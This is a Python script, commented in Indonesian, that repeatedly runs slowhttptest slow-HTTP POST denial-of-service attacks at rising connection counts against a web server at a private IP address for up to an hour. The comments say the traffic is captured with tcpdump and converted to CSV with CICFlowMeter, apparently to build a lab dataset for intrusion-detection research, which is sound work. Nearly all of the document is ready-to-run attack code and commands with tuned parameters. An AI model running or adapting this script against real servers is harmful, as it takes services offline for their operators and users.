## attack 1 jam dengan attack parameter seperti di bawah ini

# slowhttptest -c <connection> -B -r <rate> -u http://192.168.100.122/ -s <content-length> -l 60
# ini contoh yang aku pakai selama ini, tapi bisa diubah sesuai kebutuhan aka lebih sederhana

# connections      : 100 (default)
# rate : 50 (default)
# Runtime     : 240 sec
# Interval    : 10 (default)
# Follow-up   : -

# connections      : 200
# rate : 50
# Runtime     : 240 sec
# Interval    : 10
# Follow-up   : -

# connections      : 300
# rate : 50
# Runtime     : 240 sec
# Interval    : 10
# Follow-up   : -

# connections      : 400
# rate : 50
# Runtime     : 240 sec
# Interval    : 15
# Follow-up   : -

# connections      : 500
# rate : 50
# Runtime     : 240 sec
# Interval    : 10
# Follow-up   : -

# connections      : 600
# rate : 50
# Runtime     : 240 sec
# Interval    : 10
# Follow-up   : -

## saat attack ini jangan lupa trafficnya dicapture dengan tcpdump dan pcap taruh di /home/victim/project/data/pcap/. terserah yang mana duluan tcpdump atau attack command, yang penting capture seluruh trafficnya

## dari pcap itu langsung convert ke csv dengan cicflowmeter dan taruh di /home/victim/project/data/csv/ dengan nama file sesuai dengan nama pcapnya, misal pcapnya slowread.pcap maka csvnya jadi slowread.csv

import subprocess
import time
import sys

TARGET_URL = "http://192.168.100.122/"

# Ambil durasi total dari argumen command-line, default 3600 detik (1 jam) jika tidak diberikan
if len(sys.argv) > 1:
    try:
        TOTAL_RUNTIME = int(sys.argv[1])
    except ValueError:
        print("Argumen durasi harus berupa angka (detik).")
        sys.exit(1)
else:
    TOTAL_RUNTIME = 3600

# List of attack configurations: (attack_name, connections, rate, interval_list, content_length)
# Format: (nama, koneksi, rate, [interval], content_length)
attack_configs = [
    ("attack_100", 100, 50, [10], 4096),
    ("attack_200", 200, 50, [10], 4096),
    ("attack_300", 300, 50, [10], 4096),
    ("attack_400", 400, 50, [15], 4096),
    ("attack_500", 500, 50, [10], 4096),
    ("attack_600", 600, 50, [10], 4096),
]

# Runtime per attack (detik)
RUNTIME_PER_ATTACK = 240

def run_attack(attack_name, connections, rate, interval_list, content_length, runtime):
    for intv in interval_list:
        print(f"\n[INFO] Menjalankan attack: {attack_name}, connections: {connections}, rate: {rate}, runtime: {runtime}, interval: {intv}, content-length: {content_length}")
        attack_cmd = (
            f"slowhttptest -c {connections} -B -i {intv} -r {rate} "
            f"-u {TARGET_URL} -s {content_length} -t POST -l {runtime}"
        )
        print(f"[INFO] Menjalankan: {attack_cmd}")
        subprocess.run(attack_cmd, shell=True)

if __name__ == "__main__":
    start_time = time.time()
    while True:
        for attack_name, connections, rate, intervals, content_length in attack_configs:
            elapsed = time.time() - start_time
            if elapsed >= TOTAL_RUNTIME:
                print(f"\n[INFO] Waktu total {TOTAL_RUNTIME} detik sudah tercapai. Selesai.")
                sys.exit(0)
            run_attack(attack_name, connections, rate, intervals, content_length, RUNTIME_PER_ATTACK)